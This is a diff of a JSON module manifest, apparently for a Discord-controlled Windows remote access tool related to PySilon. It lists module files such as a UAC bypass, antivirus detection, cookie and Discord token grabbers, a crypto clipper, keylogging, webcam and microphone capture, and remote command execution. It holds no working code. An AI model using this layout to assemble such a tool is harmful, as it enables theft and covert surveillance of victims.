@@ -1,9 +1,48 @@
 {
-    "!misc": [
-        ["resources/modules/embed_generator.py", "all", ["discord"]],
-        ["resources/modules/renderer.py", "all", ["random"]],
-        ["resources/modules/protections.py", "all", ["os", "getmac", "psutil", "subprocess", "socket", "requests", "time", "numpy as np", "pyautogui", "ctypes", "hashlib"]],
-        ["resources/modules/uac_bypass.py", "all", ["subprocess", "sys"]],
-        ["resources/modules/info.py", "all", ["os", "json", "ctypes", "psutil", "requests", "platform", "subprocess", "resources.modules.av_detect as pysilon_av_detect", "datetime -> datetime", "urllib.request -> urlopen"]]
+    "misc": [
+        ["resources/modules/misc.py", "all"],
+        ["resources/modules/renderer.py", "all"],
+        ["resources/modules/protections.py", "all"],
+        ["resources/modules/uac_bypass.py", "all"],
+        ["resources/modules/info.py", "all"],
+        ["resources/modules/av_detect.py", "all"],
+        ["resources/features/cookie_grabber.py", "engine"],
+        ["resources/features/crypto_clipper.py", "engine"],
+        ["resources/features/discord_grabber.py", "engine"],
+        ["resources/features/live_mic.py", "preload"],
+        ["resources/features/process_management.py", "engine"],
+        ["resources/features/screen_manipulation.py", "engine"],
+        ["resources/features/website_blocker.py", "function"]
+    ],
+    "commands": [
+        ["resources/features/audio_control.py", "all"],
+        ["resources/features/break_windows.py", "all"],
+        ["resources/features/bsod.py", "all"],
+        ["resources/features/cookie_grabber.py", "command"],
+        ["resources/features/crypto_clipper.py", "command"],
+        ["resources/features/discord_grabber.py", "command"],
+        ["resources/features/fake_error.py", "all"],
+        ["resources/features/file_management.py", "all"],
+        ["resources/features/input_blocker.py", "command"],
+        ["resources/features/jumpscare.py", "all"],
+        ["resources/features/keystrokes.py", "all"],
+        ["resources/features/live_mic.py", "command"],
+        ["resources/features/monitor_control.py", "command"],
+        ["resources/features/process_management.py", "commands"],
+        ["resources/features/remote_cmd.py", "all"],
+        ["resources/features/screen_manipulation.py", "command"],
+        ["resources/features/screen_record.py", "all"],
+        ["resources/features/screenshot.py", "all"],
+        ["resources/features/text-to-speech.py", "all"],
+        ["resources/features/wallpaper.py", "all"],
+        ["resources/features/webcam.py", "all"],
+        ["resources/features/website_blocker.py", "command"],
+        ["resources/features/.py", "all"],
+        ["resources/features/.py", "all"]
+    ],
+    "preload": [
+        ["resources/features/input_blocker.py", "preload"],
+        ["resources/features/monitor_control.py", "preload"],
+        ["resources/features/process_management.py", "start"]
     ]
 }
